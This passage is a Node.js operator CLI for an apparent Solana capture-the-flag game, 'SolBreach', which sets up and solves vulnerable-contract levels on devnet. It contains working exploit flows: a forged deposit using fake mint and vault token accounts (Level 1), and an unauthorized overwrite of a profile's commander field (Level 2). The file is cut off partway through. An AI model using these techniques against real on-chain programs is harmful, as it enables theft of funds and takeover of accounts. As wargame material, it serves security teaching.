#!/usr/bin/env node

import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  TOKEN_PROGRAM_ID,
  createAccount,
  createMint,
  mintTo,
} from "@solana/spl-token";
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";

const PROGRAM_ID = new PublicKey("aVf7hEpHmn7L5ZPBhtu13apZREM7VdwFKzSJ9yNovf2");
const DEFAULT_RPC_URL =
  process.env.SOLANA_RPC_URL ??
  process.env.RPC_URL ??
  "https://api.devnet.solana.com";
const DEFAULT_KEYPAIR_PATH =
  process.env.ADMIN_KEYPAIR_PATH ?? "~/.config/solana/id.json";
const MANIFEST_DIR = ".solbreach/operator";
const LEVEL_1_TARGET = 1_000_000n;

const DISCRIMINATORS = {
  initUserStats: Uint8Array.from([177, 113, 20, 232, 181, 87, 120, 62]),
  initLevel0: Uint8Array.from([251, 245, 62, 63, 138, 203, 254, 44]),
  initBank: Uint8Array.from([73, 111, 27, 243, 202, 129, 159, 80]),
  initGlobalProfile: Uint8Array.from([58, 62, 122, 41, 39, 80, 228, 178]),
  initLevel1: Uint8Array.from([250, 112, 168, 131, 246, 44, 13, 80]),
  initLevel2: Uint8Array.from([176, 62, 169, 146, 12, 173, 203, 149]),
  depositTokens: Uint8Array.from([176, 83, 229, 18, 191, 143, 176, 150]),
  updateProfile: Uint8Array.from([98, 67, 99, 206, 86, 115, 175, 1]),
  verifyAndCloseLevel0: Uint8Array.from([88, 24, 131, 11, 54, 23, 3, 18]),
  verifyAndCloseLevel1: Uint8Array.from([148, 124, 192, 9, 124, 227, 175, 140]),
  verifyAndCloseLevel2: Uint8Array.from([91, 176, 147, 203, 107, 214, 51, 62]),
};

const HELP = `
SolBreach operator CLI

This CLI sets up and plays the local/operator flows for Levels 0, 1, and 2.
It prints the exact addresses the UI expects and tells you whether the
contract has actually been cracked yet.

Usage:
  npm run operator -- level0 setup [--rpc <url>] [--keypair <path>]
  npm run operator -- level0 verify [--rpc <url>] [--keypair <path>]
  npm run operator -- level0 status [--rpc <url>] [--keypair <path>]

  npm run operator -- level1 setup [--rpc <url>] [--keypair <path>] [--expected-mint <pubkey>] [--amount <raw-units>]
  npm run operator -- level1 exploit [--rpc <url>] [--keypair <path>] [--vault <pubkey>] [--user-token-account <pubkey>] [--amount <raw-units>]
  npm run operator -- level1 verify [--rpc <url>] [--keypair <path>]
  npm run operator -- level1 status [--rpc <url>] [--keypair <path>]

  npm run operator -- level2 setup [--rpc <url>] [--keypair <path>] [--initial-commander <pubkey>]
  npm run operator -- level2 exploit [--rpc <url>] [--keypair <path>]
  npm run operator -- level2 verify [--rpc <url>] [--keypair <path>]
  npm run operator -- level2 status [--rpc <url>] [--keypair <path>]

Options:
  --rpc <url>                RPC endpoint. Defaults to SOLANA_RPC_URL/RPC_URL or devnet.
  --keypair <path>           Solana keypair JSON path. Defaults to ${DEFAULT_KEYPAIR_PATH}.
  --expected-mint <pubkey>   Existing legit mint to use for Level 1 bank setup.
  --initial-commander <pk>   Initial non-player commander for Level 2 profile setup.
  --vault <pubkey>           Override the manifest vault token account for Level 1 exploit.
  --user-token-account <pk>  Override the manifest user token account for Level 1 exploit.
  --amount <raw-units>       Raw token amount. Default: ${LEVEL_1_TARGET.toString()}.
  --manifest <path>          Optional manifest file path override.
  --help                     Print this help.

Notes:
  - Level 0 can be completed directly from this CLI with level0 setup/verify.
  - Levels 1 and 2 require Level 0 to be completed for the connected operator wallet.
  - Setup writes a manifest under ${MANIFEST_DIR}/ so later commands can reuse the generated addresses.
  - The CLI confirms the crack by reading on-chain state after each exploit and verify step.
`.trim();

loadEnvFile(".env.local");
loadEnvFile(".env");

main().catch((error) => {
  console.error("");
  console.error("ERROR");
  console.error(`  ${formatError(error)}`);
  process.exitCode = 1;
});

async function main() {
  const options = parseArgs(process.argv.slice(2));

  if (options.help || !options.level || !options.action) {
    console.log(HELP);
    return;
  }

  const payer = loadKeypair(options.keypairPath);
  const connection = new Connection(options.rpcUrl, "confirmed");
  const cluster = detectCluster(options.rpcUrl);
  const manifestsDir = path.join(process.cwd(), MANIFEST_DIR);
  fs.mkdirSync(manifestsDir, { recursive: true });

  const context = {
    cluster,
    connection,
    manifestsDir,
    options,
    payer,
    rpcUrl: options.rpcUrl,
  };

  printBanner(context, options.level, options.action);

  if (options.level === "level0") {
    await handleLevel0(context);
    return;
  }

  if (options.level === "level1") {
    await handleLevel1(context);
    return;
  }

  if (options.level === "level2") {
    await handleLevel2(context);
    return;
  }

  throw new Error(`Unsupported level "${options.level}". Use level0, level1, or level2.`);
}

function loadEnvFile(filePath) {
  if (!fs.existsSync(filePath)) return;

  const lines = fs.readFileSync(filePath, "utf8").split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#") || !trimmed.includes("=")) continue;

    const separatorIndex = trimmed.indexOf("=");
    const key = trimmed.slice(0, separatorIndex).trim();
    const rawValue = trimmed.slice(separatorIndex + 1).trim();
    const value = rawValue.replace(/^['"]|['"]$/g, "");

    if (key && process.env[key] === undefined) {
      process.env[key] = value;
    }
  }
}

function parseArgs(argv) {
  const [level, action, ...rest] = argv;
  const options = {
    action,
    amount: LEVEL_1_TARGET,
    expectedMint: undefined,
    help: false,
    initialCommander: undefined,
    keypairPath: DEFAULT_KEYPAIR_PATH,
    level,
    manifestPath: undefined,
    rpcUrl: DEFAULT_RPC_URL,
    userTokenAccount: undefined,
    vault: undefined,
  };

  for (let i = 0; i < rest.length; i += 1) {
    const arg = rest[i];
    const [key, inlineValue] = arg.split("=", 2);
    const nextValue = () => inlineValue ?? rest[++i];

    switch (key) {
      case "--help":
      case "-h":
        options.help = true;
        break;
      case "--rpc":
        options.rpcUrl = nextValue();
        break;
      case "--keypair":
        options.keypairPath = nextValue();
        break;
      case "--expected-mint":
        options.expectedMint = nextValue();
        break;
      case "--initial-commander":
        options.initialCommander = nextValue();
        break;
      case "--vault":
        options.vault = nextValue();
        break;
      case "--user-token-account":
        options.userTokenAccount = nextValue();
        break;
      case "--amount":
        options.amount = parseBigInt(nextValue(), "--amount");
        break;
      case "--manifest":
        options.manifestPath = nextValue();
        break;
      default:
        throw new Error(`Unknown option: ${arg}`);
    }
  }

  return options;
}

function loadKeypair(filePath) {
  const resolvedPath = expandTilde(filePath);
  if (!resolvedPath || !fs.existsSync(resolvedPath)) {
    throw new Error(
      `No keypair found at ${resolvedPath}. Pass --keypair or create that file first.`
    );
  }

  const secret = JSON.parse(fs.readFileSync(resolvedPath, "utf8"));
  return Keypair.fromSecretKey(Uint8Array.from(secret));
}

function derivePdas(userPublicKey) {
  const [userStatsPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("stats"), userPublicKey.toBuffer()],
    PROGRAM_ID
  );
  const [level0Pda] = PublicKey.findProgramAddressSync(
    [Buffer.from("level_0"), userPublicKey.toBuffer()],
    PROGRAM_ID
  );
  const [bankPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("bank")],
    PROGRAM_ID
  );
  const [level1Pda] = PublicKey.findProgramAddressSync(
    [Buffer.from("level_1"), userPublicKey.toBuffer()],
    PROGRAM_ID
  );
  const [profilePda] = PublicKey.findProgramAddressSync(
    [Buffer.from("profile")],
    PROGRAM_ID
  );
  const [level2Pda] = PublicKey.findProgramAddressSync(
    [Buffer.from("level_2"), userPublicKey.toBuffer()],
    PROGRAM_ID
  );

  return {
    bankPda,
    level0Pda,
    level1Pda,
    level2Pda,
    profilePda,
    userStatsPda,
  };
}

async function handleLevel1(context) {
  const pdas = derivePdas(context.payer.publicKey);
  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  ensureLevel0Unlocked(userStats);

  switch (context.options.action) {
    case "setup":
      await handleLevel1Setup(context, pdas, userStats);
      break;
    case "exploit":
      await handleLevel1Exploit(context, pdas);
      break;
    case "verify":
      await handleLevel1Verify(context, pdas);
      break;
    case "status":
      await printLevel1Status(context, pdas);
      break;
    default:
      throw new Error(
        `Unsupported level1 action "${context.options.action}". Use setup, exploit, verify, or status.`
      );
  }
}

async function handleLevel0(context) {
  const pdas = derivePdas(context.payer.publicKey);

  switch (context.options.action) {
    case "setup":
      await handleLevel0Setup(context, pdas);
      break;
    case "verify":
      await handleLevel0Verify(context, pdas);
      break;
    case "status":
      await printLevel0Status(context, pdas);
      break;
    default:
      throw new Error(
        `Unsupported level0 action "${context.options.action}". Use setup, verify, or status.`
      );
  }
}

async function handleLevel0Setup(context, pdas) {
  const manifestPath = resolveManifestPath(context, "level0");
  let userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  let level0State = await fetchLevel0State(context.connection, pdas.level0Pda);

  if (!userStats) {
    const initUserStatsIx = buildInitUserStatsInstruction(
      context.payer.publicKey,
      pdas.userStatsPda
    );
    const signature = await sendInstructions(context.connection, context.payer, [
      initUserStatsIx,
    ]);
    console.log(`Initialized UserStats PDA: ${pdas.userStatsPda.toBase58()}`);
    console.log(`  tx: ${signature}`);
    userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  } else {
    console.log(`UserStats already exists: ${pdas.userStatsPda.toBase58()}`);
  }

  if (userStats?.completedLevels[0]) {
    console.log("Level 0 is already complete for this wallet.");
  } else if (!level0State) {
    const initLevel0Ix = buildInitLevel0Instruction(
      context.payer.publicKey,
      pdas.userStatsPda,
      pdas.level0Pda
    );
    const signature = await sendInstructions(context.connection, context.payer, [
      initLevel0Ix,
    ]);
    console.log(`Initialized Level 0 state: ${pdas.level0Pda.toBase58()}`);
    console.log(`  tx: ${signature}`);
    level0State = await fetchLevel0State(context.connection, pdas.level0Pda);
  } else {
    console.log(`Level 0 state already exists: ${pdas.level0Pda.toBase58()}`);
  }

  const manifest = {
    cluster: context.cluster,
    generatedAt: new Date().toISOString(),
    kind: "level0",
    operator: context.payer.publicKey.toBase58(),
    rpcUrl: context.rpcUrl,
    addresses: {
      level0State: pdas.level0Pda.toBase58(),
      userStats: pdas.userStatsPda.toBase58(),
    },
  };
  saveManifest(manifestPath, manifest);

  console.log("");
  console.log("LEVEL 0 SETUP READY");
  console.log(`  UserStats:          ${pdas.userStatsPda.toBase58()}`);
  console.log(`  Level 0 state:      ${pdas.level0Pda.toBase58()}`);
  console.log(`  Warmup complete:    ${userStats?.completedLevels[0] ? "yes" : "no"}`);
  console.log(`  Manifest:           ${manifestPath}`);
  console.log("");
  if (userStats?.completedLevels[0]) {
    console.log("This wallet already cleared the warmup.");
    console.log("Next: npm run operator -- level0 status");
  } else {
    console.log("Next:");
    console.log("  npm run operator -- level0 verify");
    console.log("");
    console.log(
      "Level 0 is ready. Verification should mark completed_levels[0] and close the temporary PDA."
    );
  }
}

async function handleLevel0Verify(context, pdas) {
  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  if (!userStats) {
    throw new Error("UserStats PDA is missing. Run `level0 setup` first.");
  }

  if (userStats.completedLevels[0]) {
    const level0State = await fetchLevel0State(context.connection, pdas.level0Pda);
    console.log("");
    console.log("LEVEL 0 VERIFY RESULT");
    console.log("  tx:                already settled");
    console.log("  completed[0]:      true");
    console.log(`  level0 PDA open:   ${level0State ? "yes" : "no"}`);
    console.log("  Status:            VERIFIED");
    console.log("");
    console.log("Level 0 was already completed for this wallet.");
    return;
  }

  const level0State = await fetchLevel0State(context.connection, pdas.level0Pda);
  if (!level0State) {
    throw new Error("Level 0 state is missing. Run `level0 setup` first.");
  }

  const verifyIx = buildVerifyAndCloseLevel0Instruction(
    context.payer.publicKey,
    pdas.userStatsPda,
    pdas.level0Pda
  );
  const signature = await sendInstructions(context.connection, context.payer, [
    verifyIx,
  ]);

  const userStatsAfter = await fetchUserStats(context.connection, pdas.userStatsPda);
  const level0StateAfter = await fetchLevel0State(context.connection, pdas.level0Pda);
  const verified = Boolean(
    userStatsAfter?.completedLevels[0] && level0StateAfter === null
  );

  console.log("");
  console.log("LEVEL 0 VERIFY RESULT");
  console.log(`  tx:                ${signature}`);
  console.log(`  completed[0]:      ${userStatsAfter?.completedLevels[0] ? "true" : "false"}`);
  console.log(`  level0 PDA open:   ${level0StateAfter ? "yes" : "no"}`);
  console.log(`  Status:            ${verified ? "VERIFIED" : "FAILED"}`);
  console.log("");
  if (verified) {
    console.log("Success: Level 0 is completed and the PDA was closed.");
  } else {
    console.log("Verification did not settle correctly. Inspect on-chain state with:");
    console.log("  npm run operator -- level0 status");
  }
}

async function printLevel0Status(context, pdas) {
  const manifestPath = resolveManifestPath(context, "level0");
  const manifest = tryLoadManifest(manifestPath);
  const [userStats, level0State] = await Promise.all([
    fetchUserStats(context.connection, pdas.userStatsPda),
    fetchLevel0State(context.connection, pdas.level0Pda),
  ]);

  console.log("");
  console.log("LEVEL 0 STATUS");
  console.log(`  UserStats:         ${pdas.userStatsPda.toBase58()}`);
  console.log(`  Level0 PDA:        ${pdas.level0Pda.toBase58()}`);
  console.log(`  UserStats exists:  ${userStats ? "yes" : "no"}`);
  console.log(`  Level0 exists:     ${level0State ? "yes" : "no"}`);
  console.log(`  Level 0 complete:  ${userStats?.completedLevels[0] ? "yes" : "no"}`);
  console.log(`  Player:            ${userStats?.player.toBase58() ?? "-"}`);
  if (manifest) {
    console.log(`  Manifest:          ${manifestPath}`);
  }
}

async function handleLevel1Setup(context, pdas, userStats) {
  const manifestPath = resolveManifestPath(context, "level1");
  const bank = await fetchBankConfig(context.connection, pdas.bankPda);
  let expectedMint;
  let createdExpectedMint = false;

  if (!bank) {
    if (context.options.expectedMint) {
      expectedMint = parsePublicKey(
        context.options.expectedMint,
        "Expected mint"
      );
      await assertMintExists(context.connection, expectedMint);
    } else {
      expectedMint = await createMint(
        context.connection,
        context.payer,
        context.payer.publicKey,
        null,
        0
      );
      createdExpectedMint = true;
    }

    const initBankIx = buildInitBankInstruction(
      context.payer.publicKey,
      pdas.bankPda,
      expectedMint
    );
    const signature = await sendInstructions(context.connection, context.payer, [
      initBankIx,
    ]);
    console.log(`Initialized bank PDA: ${pdas.bankPda.toBase58()}`);
    console.log(`  tx: ${signature}`);
  } else {
    expectedMint = bank.expectedMint;
    console.log(`Bank already exists: ${pdas.bankPda.toBase58()}`);
  }

  const level1State = await fetchLevel1State(context.connection, pdas.level1Pda);
  if (!level1State) {
    const initLevel1Ix = buildInitLevel1Instruction(
      context.payer.publicKey,
      pdas.userStatsPda,
      pdas.level1Pda
    );
    const signature = await sendInstructions(context.connection, context.payer, [
      initLevel1Ix,
    ]);
    console.log(`Initialized Level 1 state: ${pdas.level1Pda.toBase58()}`);
    console.log(`  tx: ${signature}`);
  } else {
    console.log(`Level 1 state already exists: ${pdas.level1Pda.toBase58()}`);
  }

  const fakeMint = await createMint(
    context.connection,
    context.payer,
    context.payer.publicKey,
    null,
    0
  );
  const fakeVaultOwner = Keypair.generate();
  const fakeUserTokenAccount = await createAccount(
    context.connection,
    context.payer,
    fakeMint,
    context.payer.publicKey
  );
  const fakeVault = await createAccount(
    context.connection,
    context.payer,
    fakeMint,
    fakeVaultOwner.publicKey
  );
  const mintSignature = await mintTo(
    context.connection,
    context.payer,
    fakeMint,
    fakeUserTokenAccount,
    context.payer,
    Number(context.options.amount)
  );

  const manifest = {
    cluster: context.cluster,
    generatedAt: new Date().toISOString(),
    kind: "level1",
    operator: context.payer.publicKey.toBase58(),
    rpcUrl: context.rpcUrl,
    addresses: {
      bank: pdas.bankPda.toBase58(),
      expectedMint: expectedMint.toBase58(),
      fakeMint: fakeMint.toBase58(),
      fakeVault: fakeVault.toBase58(),
      fakeVaultOwner: fakeVaultOwner.publicKey.toBase58(),
      level1State: pdas.level1Pda.toBase58(),
      userStats: pdas.userStatsPda.toBase58(),
      fakeUserTokenAccount: fakeUserTokenAccount.toBase58(),
    },
    amount: context.options.amount.toString(),
  };
  saveManifest(manifestPath, manifest);

  console.log("");
  console.log("LEVEL 1 SETUP READY");
  console.log(`  UserStats:          ${pdas.userStatsPda.toBase58()}`);
  console.log(`  Level 1 state:      ${pdas.level1Pda.toBase58()}`);
  console.log(`  Bank PDA:           ${pdas.bankPda.toBase58()}`);
  console.log(`  Expected mint:      ${expectedMint.toBase58()}`);
  console.log(`  Fake mint:          ${fakeMint.toBase58()}`);
  console.log(`  Fake vault:         ${fakeVault.toBase58()}`);
  console.log(`  Fake vault owner:   ${fakeVaultOwner.publicKey.toBase58()}`);
  console.log(`  Fake user account:  ${fakeUserTokenAccount.toBase58()}`);
  console.log(`  Raw amount:         ${context.options.amount.toString()}`);
  console.log(`  Mint tx:            ${mintSignature}`);
  console.log(`  Manifest:           ${manifestPath}`);
  if (createdExpectedMint) {
    console.log("  Bank mint source:   created by this setup run");
  } else {
    console.log("  Bank mint source:   reused existing mint");
  }
  console.log("");
  console.log("Next:");
  console.log("  1. Paste these addresses into the Level 1 UI panel if you want the board flow.");
  console.log("  2. Or keep going in CLI:");
  console.log("     npm run operator -- level1 exploit");
  console.log("     npm run operator -- level1 verify");
  console.log("");
  if (userStats.completedLevels[1]) {
    console.log("This wallet already has Level 1 marked complete.");
  } else {
    console.log("Level 1 is not cracked yet. Run the exploit step next.");
  }
}

async function handleLevel1Exploit(context, pdas) {
  const manifestPath = resolveManifestPath(context, "level1");
  const manifest = loadManifest(manifestPath, "level1");
  const bank = await fetchBankConfig(context.connection, pdas.bankPda);
  if (!bank) {
    throw new Error("Bank PDA is missing. Run `level1 setup` first.");
  }

  const level1StateBefore = await fetchLevel1State(context.connection, pdas.level1Pda);
  if (!level1StateBefore) {
    throw new Error("Level 1 state is missing. Run `level1 setup` first.");
  }

  const vault = parsePublicKey(
    context.options.vault ?? manifest.addresses.fakeVault,
    "Vault token account"
  );
  const userTokenAccount = parsePublicKey(
    context.options.userTokenAccount ?? manifest.addresses.fakeUserTokenAccount,
    "User token account"
  );

  const exploitIx = buildDepositTokensInstruction(
    context.payer.publicKey,
    pdas.bankPda,
    pdas.level1Pda,
    vault,
    userTokenAccount,
    context.options.amount
  );
  const signature = await sendInstructions(context.connection, context.payer, [
    exploitIx,
  ]);

  const level1StateAfter = await fetchLevel1State(context.connection, pdas.level1Pda);
  const cracked =
    level1StateAfter && level1StateAfter.depositedAmount >= LEVEL_1_TARGET;

  console.log("");
  console.log("LEVEL 1 EXPLOIT RESULT");
  console.log(`  tx:                ${signature}`);
  console.log(
    `  Deposited amount:  ${level1StateAfter?.depositedAmount.toString() ?? "missing"}`
  );
  console.log(`  Target:            ${LEVEL_1_TARGET.toString()}`);
  console.log(`  Status:            ${cracked ? "CRACKED" : "NOT CRACKED"}`);
  console.log("");
  if (cracked) {
    console.log("Success: the contract credited the forged deposit amount.");
    console.log("Next: npm run operator -- level1 verify");
  } else {
    console.log("The forged deposit did not satisfy the verifier target yet.");
    console.log("Check the fake token accounts or rerun with --amount 1000000.");
  }
}

async function handleLevel1Verify(context, pdas) {
  const level1State = await fetchLevel1State(context.connection, pdas.level1Pda);
  if (!level1State) {
    throw new Error("Level 1 state is already closed or missing.");
  }

  const verifyIx = buildVerifyAndCloseLevel1Instruction(
    context.payer.publicKey,
    pdas.userStatsPda,
    pdas.level1Pda
  );
  const signature = await sendInstructions(context.connection, context.payer, [
    verifyIx,
  ]);

  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  const level1StateAfter = await fetchLevel1State(context.connection, pdas.level1Pda);
  const verified = Boolean(
    userStats?.completedLevels[1] && level1StateAfter === null
  );

  console.log("");
  console.log("LEVEL 1 VERIFY RESULT");
  console.log(`  tx:                ${signature}`);
  console.log(`  completed[1]:      ${userStats?.completedLevels[1] ? "true" : "false"}`);
  console.log(`  level1 PDA open:   ${level1StateAfter ? "yes" : "no"}`);
  console.log(`  Status:            ${verified ? "VERIFIED" : "FAILED"}`);
  console.log("");
  if (verified) {
    console.log("Success: Level 1 is completed and the PDA was closed.");
  } else {
    console.log("Verification did not settle correctly. Inspect on-chain state with:");
    console.log("  npm run operator -- level1 status");
  }
}

async function printLevel1Status(context, pdas) {
  const manifestPath = resolveManifestPath(context, "level1");
  const manifest = tryLoadManifest(manifestPath);
  const [userStats, bank, level1State] = await Promise.all([
    fetchUserStats(context.connection, pdas.userStatsPda),
    fetchBankConfig(context.connection, pdas.bankPda),
    fetchLevel1State(context.connection, pdas.level1Pda),
  ]);

  console.log("");
  console.log("LEVEL 1 STATUS");
  console.log(`  UserStats:         ${pdas.userStatsPda.toBase58()}`);
  console.log(`  Level 0 cleared:   ${userStats?.completedLevels[0] ? "yes" : "no"}`);
  console.log(`  Level 1 complete:  ${userStats?.completedLevels[1] ? "yes" : "no"}`);
  console.log(`  Bank exists:       ${bank ? "yes" : "no"}`);
  console.log(`  Level1 exists:     ${level1State ? "yes" : "no"}`);
  console.log(`  Expected mint:     ${bank?.expectedMint.toBase58() ?? "-"}`);
  console.log(
    `  Deposited amount:  ${level1State?.depositedAmount.toString() ?? "0"}`
  );
  console.log(
    `  Contract cracked:  ${
      level1State && level1State.depositedAmount >= LEVEL_1_TARGET
        ? "yes"
        : "no"
    }`
  );
  if (manifest) {
    console.log(`  Manifest:          ${manifestPath}`);
    console.log(`  Fake vault:        ${manifest.addresses.fakeVault}`);
    console.log(`  Fake user acct:    ${manifest.addresses.fakeUserTokenAccount}`);
  }
}

async function handleLevel2(context) {
  const pdas = derivePdas(context.payer.publicKey);
  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  ensureLevel0Unlocked(userStats);

  switch (context.options.action) {
    case "setup":
      await handleLevel2Setup(context, pdas);
      break;
    case "exploit":
      await handleLevel2Exploit(context, pdas);
      break;
    case "verify":
      await handleLevel2Verify(context, pdas);
      break;
    case "status":
      await printLevel2Status(context, pdas);
      break;
    default:
      throw new Error(
        `Unsupported level2 action "${context.options.action}". Use setup, exploit, verify, or status.`
      );
  }
}

async function handleLevel2Setup(context, pdas) {
  const manifestPath = resolveManifestPath(context, "level2");
  const profile = await fetchUserProfile(context.connection, pdas.profilePda);
  let initialCommander;

  if (!profile) {
    initialCommander = context.options.initialCommander
      ? parsePublicKey(context.options.initialCommander, "Initial commander")
      : Keypair.generate().publicKey;

    if (initialCommander.equals(context.payer.publicKey)) {
      throw new Error(
        "Initial commander must be different from the connected operator wallet."
      );
    }

    const initProfileIx = buildInitGlobalProfileInstruction(
      context.payer.publicKey,
      pdas.profilePda,
      initialCommander
    );
    const signature = await sendInstructions(context.connection, context.payer, [
      initProfileIx,
    ]);
    console.log(`Initialized global profile: ${pdas.profilePda.toBase58()}`);
    console.log(`  tx: ${signature}`);
  } else {
    initialCommander = profile.commander;
    console.log(`Global profile already exists: ${pdas.profilePda.toBase58()}`);
  }

  const level2State = await fetchLevel2State(context.connection, pdas.level2Pda);
  if (!level2State) {
    const initLevel2Ix = buildInitLevel2Instruction(
      context.payer.publicKey,
      pdas.userStatsPda,
      pdas.level2Pda
    );
    const signature = await sendInstructions(context.connection, context.payer, [
      initLevel2Ix,
    ]);
    console.log(`Initialized Level 2 state: ${pdas.level2Pda.toBase58()}`);
    console.log(`  tx: ${signature}`);
  } else {
    console.log(`Level 2 state already exists: ${pdas.level2Pda.toBase58()}`);
  }

  const manifest = {
    cluster: context.cluster,
    generatedAt: new Date().toISOString(),
    kind: "level2",
    operator: context.payer.publicKey.toBase58(),
    rpcUrl: context.rpcUrl,
    addresses: {
      level2State: pdas.level2Pda.toBase58(),
      profile: pdas.profilePda.toBase58(),
      userStats: pdas.userStatsPda.toBase58(),
    },
    initialCommander: initialCommander.toBase58(),
  };
  saveManifest(manifestPath, manifest);

  console.log("");
  console.log("LEVEL 2 SETUP READY");
  console.log(`  Profile PDA:        ${pdas.profilePda.toBase58()}`);
  console.log(`  Level 2 state:      ${pdas.level2Pda.toBase58()}`);
  console.log(`  Initial commander:  ${initialCommander.toBase58()}`);
  console.log(`  Manifest:           ${manifestPath}`);
  console.log("");
  console.log("Next:");
  console.log("  1. Paste the initial commander into the Level 2 UI if you want the board flow.");
  console.log("  2. Or keep going in CLI:");
  console.log("     npm run operator -- level2 exploit");
  console.log("     npm run operator -- level2 verify");
}

async function handleLevel2Exploit(context, pdas) {
  const level2State = await fetchLevel2State(context.connection, pdas.level2Pda);
  if (!level2State) {
    throw new Error("Level 2 state is missing. Run `level2 setup` first.");
  }

  const profileBefore = await fetchUserProfile(context.connection, pdas.profilePda);
  if (!profileBefore) {
    throw new Error("Global profile is missing. Run `level2 setup` first.");
  }

  const updateIx = buildUpdateProfileInstruction(
    context.payer.publicKey,
    pdas.profilePda
  );
  const signature = await sendInstructions(context.connection, context.payer, [
    updateIx,
  ]);

  const profileAfter = await fetchUserProfile(context.connection, pdas.profilePda);
  const cracked = Boolean(
    profileAfter?.commander.equals(context.payer.publicKey)
  );

  console.log("");
  console.log("LEVEL 2 EXPLOIT RESULT");
  console.log(`  tx:                ${signature}`);
  console.log(
    `  Commander:         ${profileAfter?.commander.toBase58() ?? "missing"}`
  );
  console.log(`  Status:            ${cracked ? "CRACKED" : "NOT CRACKED"}`);
  console.log("");
  if (cracked) {
    console.log("Success: the global profile now points at your wallet.");
    console.log("Next: npm run operator -- level2 verify");
  } else {
    console.log("The commander field was not overwritten. Inspect the profile with:");
    console.log("  npm run operator -- level2 status");
  }
}

async function handleLevel2Verify(context, pdas) {
  const profile = await fetchUserProfile(context.connection, pdas.profilePda);
  if (!profile) {
    throw new Error("Global profile is missing.");
  }

  const level2State = await fetchLevel2State(context.connection, pdas.level2Pda);
  if (!level2State) {
    throw new Error("Level 2 state is already closed or missing.");
  }

  const verifyIx = buildVerifyAndCloseLevel2Instruction(
    context.payer.publicKey,
    pdas.userStatsPda,
    pdas.level2Pda,
    pdas.profilePda
  );
  const signature = await sendInstructions(context.connection, context.payer, [
    verifyIx,
  ]);

  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
  const level2StateAfter = await fetchLevel2State(context.connection, pdas.level2Pda);
  const verified = Boolean(
    userStats?.completedLevels[2] && level2StateAfter === null
  );

  console.log("");
  console.log("LEVEL 2 VERIFY RESULT");
  console.log(`  tx:                ${signature}`);
  console.log(`  completed[2]:      ${userStats?.completedLevels[2] ? "true" : "false"}`);
  console.log(`  level2 PDA open:   ${level2StateAfter ? "yes" : "no"}`);
  console.log(`  Status:            ${verified ? "VERIFIED" : "FAILED"}`);
  console.log("");
  if (verified) {
    console.log("Success: Level 2 is completed and the PDA was closed.");
  } else {
    console.log("Verification did not settle correctly. Inspect on-chain state with:");
    console.log("  npm run operator -- level2 status");
  }
}

async function printLevel2Status(context, pdas) {
  const manifestPath = resolveManifestPath(context, "level2");
  const manifest = tryLoadManifest(manifestPath);
  const [userStats, profile, level2State] = await Promise.all([
    fetchUserStats(context.connection, pdas.userStatsPda),
    fetchUserProfile(context.connection, pdas.profilePda),
    fetchLevel2State(context.connection, pdas.level2Pda),
  ]);

  console.log("");
  console.log("LEVEL 2 STATUS");
  console.log(`  UserStats:         ${pdas.userStatsPda.toBase58()}`);
  console.log(`  Level 0 cleared:   ${userStats?.completedLevels[0] ? "yes" : "no"}`);
  console.log(`  Level 2 complete:  ${userStats?.completedLevels[2] ? "yes" : "no"}`);
  console.log(`  Profile exists:    ${profile ? "yes" : "no"}`);
  console.log(`  Level2 exists:     ${level2State ? "yes" : "no"}`);
  console.log(`  Commander:         ${profile?.commander.toBase58() ?? "-"}`);
  console.log(
    `  Contract cracked:  ${
      profile?.commander.equals(context.payer.publicKey) ? "yes" : "no"
    }`
  );
  if (manifest) {
    console.log(`  Manifest:          ${manifestPath}`);
    console.log(`  Initial commander: ${manifest.initialCommander}`);
  }
}

function ensureLevel0Unlocked(userStats) {
  if (!userStats) {
    throw new Error(
      "UserStats PDA is missing. Finish Level 0 in the UI before using the operator CLI."
    );
  }

  if (!userStats.completedLevels[0]) {
    throw new Error(
      "Level 0 is not completed for this wallet yet. Clear the warmup first."
    );
  }
}

async function fetchUserStats(connection, publicKey) {
  const account = await connection.getAccountInfo(publicKey, "confirmed");
  if (!account) return null;

  return {
    bump: account.data[44],
    completedLevels: Array.from(account.data.slice(40, 44)).map(
      (value) => value !== 0
    ),
    player: new PublicKey(account.data.slice(8, 40)),
  };
}

async function fetchLevel0State(connection, publicKey) {
  const account = await connection.getAccountInfo(publicKey, "confirmed");
  if (!account) return null;

  return {
    bump: account.data[40],
    player: new PublicKey(account.data.slice(8, 40)),
  };
}

async function fetchBankConfig(connection, publicKey) {
  const account = await connection.getAccountInfo(publicKey, "confirmed");
  if (!account) return null;

  return {
    bump: account.data[40],
    expectedMint: new PublicKey(account.data.slice(8, 40)),
  };
}

async function fetchLevel1State(connection, publicKey) {
  const account = await connection.getAccountInfo(publicKey, "confirmed");
  if (!account) return null;

  return {
    bump: account.data[48],
    depositedAmount: account.data.readBigUInt64LE(40),
    player: new PublicKey(account.data.slice(8, 40)),
  };
}

async function fetchUserProfile(connection, publicKey) {
  const account = await connection.getAccountInfo(publicKey, "confirmed");
  if (!account) return null;

  return {
    bump: account.data[40],
    commander: new PublicKey(account.data.slice(8, 40)),
  };
}

async function fetchLevel2State(connection, publicKey) {
  const account = await connection.getAccountInfo(publicKey, "confirmed");
  if (!account) return null;

  return {
    bump: account.data[40],
    player: new PublicKey(account.data.slice(8, 40)),
  };
}

async function assertMintExists(connection, mintPublicKey) {
  const account = await connection.getAccountInfo(mintPublicKey, "confirmed");
  if (!account) {
    throw new Error(`Mint ${mintPublicKey.toBase58()} does not exist on this cluster.`);
  }
  if (!account.owner.equals(TOKEN_PROGRAM_ID)) {
    throw new Error(
      `Mint ${mintPublicKey.toBase58()} is not owned by the SPL Token program.`
    );
  }
}

function buildInitBankInstruction(admin, bank, expectedMint) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: admin, isSigner: true, isWritable: true },
